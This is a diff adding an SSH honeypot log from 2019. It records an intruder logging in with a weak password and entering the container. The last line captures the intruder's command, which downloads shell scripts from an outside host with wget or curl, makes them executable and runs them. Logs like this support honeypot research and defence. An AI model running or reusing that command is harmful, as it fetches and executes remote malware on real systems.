@@ -1,0 +1,15 @@
+2019-11-16 18:37:22.212 - [Info] MITM Version: 1.26
+2019-11-16 18:37:22.219 - [Info] Auto Access Enabled: true
+2019-11-16 18:37:22.220 - [Debug] [Init] Auto Access Barrier: true
+2019-11-16 18:37:22.243 - [Info] SSH man-in-the-middle server for 172.20.0.4 listening on 0.0.0.0:10103
+2019-11-16 18:39:52.386 - [Debug] [Connection] Attacker connected: 213.86.15.35 | Client Identification: SSH-2.0-Go
+2019-11-16 18:39:54.220 - [Debug] [Auth] Attacker 213.86.15.35 trying to authenticate with "none"
+2019-11-16 18:39:54.221 - [Debug] [Auth] Attacker authentication error: No authentication method provided
+2019-11-16 18:39:54.499 - [Debug] [Auth] Attacker 213.86.15.35 trying to authenticate with "password"
+2019-11-16 18:39:54.501 - [Debug] [Auto Access] Attacker: 213.86.15.35, Threshold: 1, Attempts: 1
+2019-11-16 18:39:54.501 - [Debug] [Auto Access] Compromising the honeypot
+2019-11-16 18:39:54.502 - [Debug] [Auto Access] Adding the following credentials: "nexthink:123456"
+2019-11-16 18:39:54.928 - [Debug] [Auth] Valid credentials - Password Authentication
+2019-11-16 18:39:54.929 - [Debug] [LXC] Attempting to connect to the honeypot: 172.20.0.4
+2019-11-16 18:39:55.020 - [Debug] [LXC-Auth] Attacker authenticated and is inside container
+2019-11-16 18:39:55.544 - [Debug] [EXEC] Noninteractive mode attacker command: echo 'cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && rm *.sh; wget http://ardp.hldns.ru/bin.sh || curl http://ardp.hldns.ru/curl.sh -o curl.sh || chmod +x *.sh; ./bin.sh; ./curl.sh' | sh
